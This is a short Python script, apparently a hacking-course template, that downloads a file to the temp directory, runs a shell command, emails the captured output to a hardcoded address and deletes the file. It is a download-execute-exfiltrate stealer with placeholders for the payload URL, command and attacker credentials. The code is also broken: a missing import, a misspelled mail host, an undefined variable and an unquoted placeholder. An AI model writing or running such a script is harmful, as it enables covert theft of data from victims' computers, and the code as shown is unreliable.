#!/usr/bin/env python

import requests, subprocess, os, tempfile

def download(url):
    get_response = requests.get(url)
    print(get_response.content)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

def send_email(email, password, message):
    server = smtplib.SMTP("smptp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(mail, mail, message)
    server.quit()

result=" "
# cross platform way of getting temp dir
temp_directory=tempfile.gettempdir()
# os is also a cross platform module
os.chdir(temp_directory)
download("<file url to be executed")
current_result=subprocess.check_output("<command to execute", shell=True)
result = result + current_result
send_email("<email id to recieve logs", "<password>", result)
os.remove(<file_name_to_remove>)
